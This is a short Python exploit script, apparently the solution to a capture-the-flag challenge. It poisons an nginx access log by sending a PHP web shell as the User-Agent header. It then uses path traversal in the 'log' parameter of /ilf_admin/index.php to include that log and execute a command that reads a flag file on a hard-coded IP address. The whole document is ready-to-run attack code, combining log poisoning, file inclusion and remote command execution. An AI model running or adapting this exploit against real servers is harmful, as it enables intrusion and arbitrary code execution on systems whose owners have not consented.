#!/usr/bin/python3


import requests
import os



def implement_remote_file_inclusion(base_url: str, agent: str) -> None:

    headers = {
        "User-Agent": agent
    }

    sess = requests.session()
    sess.get(url=base_url+"/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log", headers=headers)
    print("\t[*] Trying to get the rce")

    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"

    response = sess.get(url=base_url+"/ilf_admin/index.php?log=../../../../../../var/log/nginx/access.log&cmd=cat ../../../../../flag_dacc60f2348d.txt", headers=headers).text

    print(response)



def main():
    implement_remote_file_inclusion(
            base_url="http://157.245.44.97:31967",
            agent="<?php system($_GET['cmd']); ?>"
    )


if __name__ == "__main__":
    main()
